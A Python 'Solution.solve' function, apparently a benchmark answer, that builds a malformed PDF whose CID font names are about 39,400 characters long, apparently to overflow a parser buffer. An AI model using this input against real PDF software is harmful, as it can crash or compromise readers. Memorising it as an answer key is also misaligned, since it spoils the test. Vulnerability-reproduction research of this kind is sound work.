class Solution:
    def solve(self, src_path: str) -> bytes:
        M = 39400
        long_reg = '/' + 'A' * M
        long_ord = '/' + 'A' * M
        header = "%PDF-1.4\n"
        offsets = []
        body_parts = []
        current_offset = len(header)
        # Object 1
        i = 1
        obj_header = f"{i} 0 obj\n"
        obj_body = "<< /Type /Catalog /Pages 2 0 R >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 2
        i = 2
        obj_header = f"{i} 0 obj\n"
        obj_body = "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 3
        i = 3
        obj_header = f"{i} 0 obj\n"
        obj_body = "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 4
        i = 4
        obj_header = f"{i} 0 obj\n"
        stream_content = "BT /F1 12 Tf 100 700 Td (Hello World) Tj ET\n"
        obj_body = f"<< /Length {len(stream_content)} >>\nstream\n{stream_content}endstream\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 5
        i = 5
        obj_header = f"{i} 0 obj\n"
        obj_body = "<< /Type /Font /Subtype /Type0 /BaseFont /CIDFont /Encoding /Identity-H /DescendantFonts [6 0 R] >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 6
        i = 6
        obj_header = f"{i} 0 obj\n"
        obj_body = "<< /Type /Font /Subtype /CIDFontType0 /BaseFont /CIDFont /CIDSystemInfo 7 0 R /DW 1000 /W [0 [1000]] >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        # Object 7
        i = 7
        obj_header = f"{i} 0 obj\n"
        obj_body = f"<< /Registry {long_reg} /Ordering {long_ord} >>\n"
        obj_footer = "endobj\n"
        obj_str = obj_header + obj_body + obj_footer
        offset = current_offset
        offsets.append(offset)
        body_parts.append(obj_str)
        current_offset += len(obj_str)
        body = ''.join(body_parts)
        xref_offset = current_offset
        xref = "xref\n0 8\n0000000000 65535 f \n"
        for off in offsets:
            xref += f"{off:010d} 00000 n \n"
        trailer = f"""trailer
<< /Size 8 /Root 1 0 R >>
startxref
{xref_offset}
%%EOF
"""
        full_pdf = header + body + xref + trailer
        return full_pdf.encode('latin-1')